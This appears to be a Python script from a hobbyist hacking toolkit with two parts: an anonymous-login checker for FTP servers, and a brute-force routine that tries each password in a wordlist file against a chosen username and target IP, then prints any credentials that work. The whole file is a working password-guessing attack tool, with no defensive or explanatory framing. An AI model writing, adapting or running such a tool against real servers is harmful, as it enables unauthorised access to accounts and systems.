import ftplib
import os

G = "\033[32m"    # Green
W = "\033[0m"     # White
R = "\033[31m"    # Red
C = "\033[36m"    # Cyan

def anonftp():
 os.system("figlet Anon Ftp")
 print("")
 hostname=input("[#] Enter hostname : ")
 try:
  ftp = ftplib.FTP(hostname)
  ftp.login('anonymous', 'me@your.com')
  print('[*] FTP Anonymous Login Succeeded')
  ftp.quit()
  return True
 except:
  print('[#] Anonymous Login Failed.')
  return False 

def ftpbrute():
  flag=False
  os.system("figlet Ftp-Brute")
  print("="*30)
  x=input("[#] Enter Target IP  : ")
  user=input("[#] User name : ")
  y=input("[#] file name : ")
  print(30*"=")
  files=open(f"txtfiles/{y}",encoding="ISO-8859-1")
  for line in files:
    pwd=line.strip()
    try:
     ftp = ftplib.FTP(x)
     ftp.login(user,pwd)
     print(25*"-")
     print(f'{G}[*] FTP  Login Succeeded')
     print(f"[~] User : {user}")
     print(f"[~] Password  : {pwd}{W}")
     flag=True
     print(25*"-")
     break
    except KeyboardInterrupt:
      print(30*"=")
      print("[ !! ] Keyboard Interrupt ; Terminated :)")
      print(30*"=")
      break
    except:
     pass
  if flag ==False:
   	print(f"{R}[•] Not password match{W}")
  else:
   	pass